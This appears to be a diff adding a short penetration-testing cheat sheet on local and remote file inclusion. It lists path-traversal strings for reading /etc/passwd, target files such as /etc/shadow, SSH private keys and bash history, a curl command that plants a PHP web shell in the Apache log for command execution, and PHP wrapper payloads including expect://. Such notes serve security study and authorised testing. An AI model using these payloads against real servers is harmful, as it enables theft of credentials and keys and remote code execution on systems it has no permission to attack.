@@ -1,0 +1,45 @@
+# LFI / RFI
+
+## Basic LFI
+
+Start with direct paths, then add traversal sequences if the app strips or validates the prefix.
+
+```
+/etc/passwd
+../../../../etc/passwd
+....//....//etc/passwd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+```
+
+## Interesting Files
+
+These paths are high-value targets once LFI is confirmed: `/etc/shadow` needs root, but logs and history files often don't.
+
+```
+/etc/passwd
+/etc/shadow
+/proc/self/environ
+/var/log/apache2/access.log
+~/.ssh/id_rsa
+~/.bash_history
+/var/www/html/config.php
+```
+
+## Log Poisoning
+
+Inject PHP into a log file via a poisoned User-Agent or parameter, then include the log via LFI to get code execution.
+
+```bash
+curl -A "<?php system(\$_GET['cmd']); ?>" http://<IP>/
+# Trigger: http://<IP>/page?file=/var/log/apache2/access.log&cmd=id
+```
+
+## PHP Wrappers
+
+PHP stream wrappers let you read source code, inject input, or execute commands without needing a poisoned file.
+
+```
+php://filter/convert.base64-encode/resource=index.php
+php://input
+expect://id
+```
